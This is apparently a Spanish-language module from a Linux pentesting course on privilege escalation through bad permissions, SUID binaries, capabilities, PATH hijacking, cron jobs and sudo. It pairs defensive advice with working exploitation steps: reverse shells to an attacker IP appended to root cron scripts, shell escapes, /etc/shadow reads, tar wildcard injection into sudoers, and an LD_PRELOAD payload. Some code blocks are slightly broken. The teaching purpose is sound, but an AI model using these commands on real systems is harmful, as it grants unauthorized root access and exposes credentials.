#### 🔍 Buscar Archivos World-Writable

# Buscar archivos escribibles por todos en el sistema:
usuario@target:~$ find / -type f -perm -002 2>/dev/null
/tmp/script_inseguro.sh
/var/www/html/config.php
/home/admin/.ssh/authorized_keys
# ⚠️ Cualquiera puede modificar estos archivos

# Buscar directorios world-writable:
usuario@target:~$ find / -type d -perm -002 2>/dev/null
/tmp
/var/tmp
/var/log/backup

# Buscar archivos con permisos 777:
usuario@target:~$ find / -type f -perm 0777 2>/dev/null

#### ⚡ Explotación

**Escenario: Script ejecutado por root con permisos 777**

# Encontrar script ejecutado por cron como root:
usuario@target:~$ cat /etc/crontab
*/5 * * * * root /opt/backup/cleanup.sh

usuario@target:~$ ls -l /opt/backup/cleanup.sh
-rwxrwxrwx 1 root root 150 Jan 15 10:00 /opt/backup/cleanup.sh
# ¡Todos pueden modificarlo y se ejecuta como root!

# Inyectar reverse shell:
usuario@target:~$ echo 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1' >> /opt/backup/cleanup.sh

# Esperar a que cron lo ejecute (máximo 5 minutos)
# En tu máquina atacante:
kali@attacker:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.100 45678
root@target:~# # ¡Shell de root!

#### 🛡️ Defensa

* NUNCA usar permisos 777 o 666

* Scripts ejecutados por root deben tener permisos 700 o 755 (solo root puede escribir)

* Auditar regularmente: `find / -perm -002 -type f 2>/dev/null`

      ⚡ Binarios SUID/SGID (Set User/Group ID)

#### Vector Crítico: Binarios SUID/SGID

El bit SUID permite que un archivo se ejecute con los permisos de su propietario (no del usuario que lo ejecuta). Si el propietario es root, cualquiera que ejecute el archivo tiene poderes de root temporalmente.

#### 🔍 ¿Qué es SUID?

```bash
Permiso normal:   -rwxr-xr-x    (755)
Con SUID:         -rw<strong style="color: #f44336;">s</strong>r-xr-x    (4755)
                      ↑
                  's' en lugar de 'x' = SUID activo

Con SGID:         -rwxr-<strong style="color: #f44336;">s</strong>r-x    (2755)
                        ↑
                    's' en grupo = SGID activo
```

**¿Qué hace?**

* SUID: El archivo se ejecuta como su propietario (no como quien lo ejecuta)

* SGID: El archivo se ejecuta como su grupo propietario

* Ejemplo legítimo: `/usr/bin/passwd` tiene SUID para poder modificar /etc/shadow (que solo root puede escribir)

#### 🔍 Buscar Binarios SUID/SGID

# Buscar todos los binarios SUID en el sistema:
usuario@target:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/opt/scripts/backup_tool
/home/admin/custom_script

# Buscar binarios SGID:
usuario@target:~$ find / -perm -2000 -type f 2>/dev/null

# Buscar ambos (SUID o SGID):
usuario@target:~$ find / -perm -4000 -o -perm -2000 -type f 2>/dev/null

# Ver detalles de un binario SUID:
usuario@target:~$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 May 28  2024 /usr/bin/passwd
#   ↑ 's' indica SUID activo

#### ⚡ Explotación - Ejemplo 1: Binario SUID Peligroso

**Escenario: Comando 'find' con SUID**

# Encontrar que find tiene SUID (muy peligroso):
usuario@target:~$ ls -l /usr/bin/find
-rwsr-xr-x 1 root root 234K Feb 1 2024 /usr/bin/find

# Explotar para obtener shell de root:
usuario@target:~$ find . -exec /bin/bash -p \; -quit
root@target:~# # ¡Shell de root!

root@target:~# whoami
root

#### ⚡ Explotación - Ejemplo 2: Script Personalizado SUID

**Escenario: Script custom con SUID que ejecuta comandos**

# Encontrar script SUID personalizado:
usuario@target:~$ find / -user root -perm -4000 2>/dev/null | grep -v '/usr/bin'
/opt/tools/system_check.sh

usuario@target:~$ ls -l /opt/tools/system_check.sh
-rwsr-xr-x 1 root root 215 Jan 10 14:00 /opt/tools/system_check.sh

# Ver contenido:
usuario@target:~$ cat /opt/tools/system_check.sh
#!/bin/bash
echo "Running system check..."
df -h
free -m
$1  # ¡Ejecuta el primer argumento como comando!

# Explotar:
usuario@target:~$ /opt/tools/system_check.sh "/bin/bash"
root@target:~# # ¡Shell de root!

#### 🎯 Binarios SUID Comúnmente Explotables

* find - `find . -exec /bin/sh -p \; -quit`

* vim - `vim -c ':!/bin/sh' -c ':q'`

* nano - Reset, luego `^R^X` y ejecutar comandos

* less/more - `!/bin/sh`

* python - `python -c 'import os; os.setuid(0); os.system("/bin/bash")'`

* perl - `perl -e 'exec "/bin/sh";'`

* nmap (versiones antiguas) - Modo interactivo

**Recurso:** [GTFOBins](https://gtfobins.github.io/) - Busca el binario y filtra por "SUID"

#### 🛡️ Defensa

* Auditar binarios SUID regularmente

* Eliminar SUID de binarios que no lo necesiten: `chmod u-s archivo`

* NUNCA poner SUID en scripts de shell (bash, python, perl)

      🎯 Linux Capabilities

#### Vector de Ataque: Linux Capabilities

Las capabilities dividen los privilegios de root en unidades más pequeñas. Un binario puede tener capabilities específicas sin necesidad de SUID, pero mal configuradas permiten escalada de privilegios.

#### 📖 ¿Qué son las Capabilities?

En lugar de dar SUID (todos los poderes de root), las capabilities dan **permisos específicos**:

* `CAP_SETUID` - Cambiar UID (convertirse en otro usuario)

* `CAP_NET_RAW` - Usar sockets raw (capturar tráfico)

* `CAP_DAC_OVERRIDE` - Ignorar permisos de archivos

* `CAP_CHOWN` - Cambiar propietario de archivos

#### 🔍 Enumerar Binarios con Capabilities

# Buscar binarios con capabilities:
usuario@target:~$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.8 cap_setuid=ep
/usr/bin/node cap_net_bind_service=ep
/opt/monitor/check_network cap_net_raw,cap_net_admin=ep

# Ver capabilities de un binario específico:
usuario@target:~$ getcap /usr/bin/python3.8
/usr/bin/python3.8 cap_setuid=ep

#### ⚡ Explotación - CAP_SETUID

**Si python tiene CAP_SETUID, puede cambiar su UID a 0 (root):**

# Verificar capability:
usuario@target:~$ getcap /usr/bin/python3
/usr/bin/python3 cap_setuid=ep

# Explotar para obtener shell de root:
usuario@target:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@target:~# # ¡Shell de root!

root@target:~# whoami
root

#### ⚡ Explotación - CAP_DAC_READ_SEARCH

**Permite leer cualquier archivo (incluido /etc/shadow):**

# Si tar tiene CAP_DAC_READ_SEARCH:
usuario@target:~$ getcap /usr/bin/tar
/usr/bin/tar cap_dac_read_search=ep

# Leer /etc/shadow:
usuario@target:~$ tar -czf shadow.tar.gz /etc/shadow 2>/dev/null
usuario@target:~$ tar -xzf shadow.tar.gz -O etc/shadow
root:$6$xyz123...:19752:0:99999:7:::
...
# Ahora puedes crackear las contraseñas con John

#### 🎯 Capabilities Peligrosas

| Capability | Riesgo | Explotación |
| --- | --- | --- |
| `CAP_SETUID` | 🔴 Crítico | Cambiar UID a 0 (root) |
| `CAP_SETGID` | 🔴 Crítico | Cambiar GID a 0 (root) |
| `CAP_DAC_OVERRIDE` | 🔴 Crítico | Ignorar permisos de lectura/escritura |
| `CAP_DAC_READ_SEARCH` | 🟠 Alto | Leer cualquier archivo |
| `CAP_CHOWN` | 🟠 Alto | Cambiar propietario de archivos |
| `CAP_NET_RAW` | 🟡 Medio | Capturar tráfico de red |

#### 🛡️ Defensa

* Auditar capabilities: `getcap -r / 2>/dev/null`

* Eliminar capabilities innecesarias: `setcap -r /path/to/binary`

* Usar capabilities en lugar de SUID cuando sea posible (menor superficie de ataque)

      📁 PATH Hijacking en Directorios Escribibles

#### Vector de Ataque: Directorios Escribibles en $PATH

Si un directorio en tu `$PATH` es escribible, puedes crear binarios maliciosos que se ejecutarán en lugar de los legítimos.

#### 🔍 Detectar PATH Hijacking

# Ver tu PATH actual:
usuario@target:~$ echo $PATH
/home/usuario/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Verificar permisos de cada directorio en PATH:
usuario@target:~$ ls -ld /home/usuario/bin
drwxrwxrwx 2 usuario usuario 4096 Feb 6 10:00 /home/usuario/bin
# ⚠️ ¡Escribible por todos!

# Script para auditar PATH:
usuario@target:~$ echo $PATH | tr ':' '\n' | while read dir; do ls -ld "$dir" 2>/dev/null; done

#### ⚡ Explotación

**Escenario: Script de root ejecuta 'ls' sin ruta absoluta y tu directorio está primero en PATH**

# Crear binario malicioso llamado 'ls':
usuario@target:~$ cat > /home/usuario/bin/ls usuario@target:~$ chmod +x /home/usuario/bin/ls

# Cuando root ejecute un script que use 'ls':
# El script de root ejecuta: ls /var/log
# Pero como /home/usuario/bin está primero en PATH...
root@target:~# # ¡Se ejecuta TU 'ls' malicioso como root!

#### 🛡️ Defensa

* Scripts de root deben usar rutas absolutas: `/bin/ls` en lugar de `ls`

* No poner directorios escribibles por usuarios en PATH de root

* Directorios en PATH deben tener permisos 755 (solo root puede escribir)

      ⏰ Cron Jobs con Permisos Inseguros

#### Vector de Ataque: Cron Jobs Manipulables

Tareas programadas (cron) que ejecutan scripts con permisos inadecuados o en directorios escribibles.

#### 🔍 Enumerar Cron Jobs

# Ver crontab del sistema:
usuario@target:~$ cat /etc/crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/5 * * * * root /opt/scripts/cleanup.sh
0 2 * * * root /usr/local/bin/backup.sh

# Ver cron jobs en /etc/cron.d/:
usuario@target:~$ ls -la /etc/cron.d/
usuario@target:~$ cat /etc/cron.d/*

# Tu crontab personal:
usuario@target:~$ crontab -l

# Verificar permisos de scripts ejecutados:
usuario@target:~$ ls -l /opt/scripts/cleanup.sh
-rwxrwxrwx 1 root root 234 Jan 15 10:00 /opt/scripts/cleanup.sh
# ⚠️ ¡Escribible por todos!

#### ⚡ Explotación

**Modificar script ejecutado por cron como root:**

# Añadir reverse shell al script:
usuario@target:~$ echo 'bash -i >& /dev/tcp/10.10.10.5/4444 0>&1' >> /opt/scripts/cleanup.sh

# En máquina atacante, escuchar:
kali@attacker:~$ nc -lvnp 4444

# Esperar a que cron ejecute el script (cada 5 minutos en este caso)
Connection received!
root@target:~# # ¡Shell de root!

#### 🔍 Buscar Cron Jobs con Wildcards

**Explotación de wildcards en tar:**

# Encontrar cron con wildcard:
usuario@target:~$ cat /etc/crontab
*/10 * * * * root cd /var/backups && tar -czf backup.tar.gz *

# Crear archivos maliciosos:
usuario@target:~$ cd /var/backups
usuario@target:/var/backups$ echo 'echo "usuario ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
usuario@target:/var/backups$ chmod +x shell.sh
usuario@target:/var/backups$ touch ./--checkpoint=1
usuario@target:/var/backups$ touch ./--checkpoint-action=exec=sh\ shell.sh

# Cuando cron ejecute el tar, interpretará los archivos como opciones:
# tar -czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
# Y ejecutará shell.sh como root

      🔓 Sudo Misconfigurations

#### Vector de Ataque: Configuraciones Inseguras de Sudo

Permisos sudo mal configurados que permiten escalada de privilegios.

#### 🔍 Enumerar Permisos Sudo

usuario@target:~$ sudo -l
User usuario may run the following commands:
    (root) NOPASSWD: /usr/bin/vim /var/log/*.log
    (root) /usr/bin/find
    (ALL) NOPASSWD: /opt/scripts/*.sh

#### ⚡ Explotación - Wildcards en Paths

**Escenario: Sudo permite ejecutar scripts con wildcard:**

# Permiso: (ALL) NOPASSWD: /opt/scripts/*.sh

# Crear symlink malicioso:
usuario@target:~$ ln -s /bin/bash /opt/scripts/evil.sh
usuario@target:~$ sudo /opt/scripts/evil.sh
root@target:~# # ¡Shell de root!

#### ⚡ Explotación - Editores con Sudo

**vim con sudo permite escapar a shell:**

# Permiso: (root) /usr/bin/vim

usuario@target:~$ sudo vim
# Dentro de vim:
:set shell=/bin/bash
:shell
root@target:~# # ¡Shell de root!

#### ⚡ Explotación - Variables de Entorno

**LD_PRELOAD con sudo:**

# Verificar si LD_PRELOAD está permitido:
usuario@target:~$ sudo -l
User usuario may run the following commands:
    (root) NOPASSWD: /usr/bin/find
    env_keep+=LD_PRELOAD

# Crear librería maliciosa:
usuario@target:~$ cat > /tmp/shell.c
#include
#include

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF

usuario@target:~$ gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
usuario@target:~$ sudo LD_PRELOAD=/tmp/shell.so find
root@target:~# # ¡Shell de root!

  [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|← Volver al Índice del Curso]]

Módulo: Permisos y Propietarios - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v4.0

---

## 🔗 Navegación
* 🐧 [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|Volver al Portal del Curso de Linux]]
* 🗂️ [[02 - MODULOS/Prácticas (PoCs)/Linux/00 - Índice del Módulo Linux|Índice General de Linux]]
